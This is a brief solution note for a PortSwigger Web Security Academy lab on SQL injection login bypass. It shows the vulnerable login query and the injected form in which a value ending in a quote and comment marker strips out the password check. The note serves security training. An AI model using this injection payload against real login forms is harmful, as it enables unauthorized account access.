--Name: SQL injection vulnerability allowing login bypass
--URL:https://portswigger.net/web-security/sql-injection/lab-login-bypass
--Level:Easy Time: 5 min
---------------------------------------------------------------------------------
SELECT * FROM users WHERE name='administrator' and password='?'


SELECT * FROM users WHERE name='administrator'-- and password='?'   Solved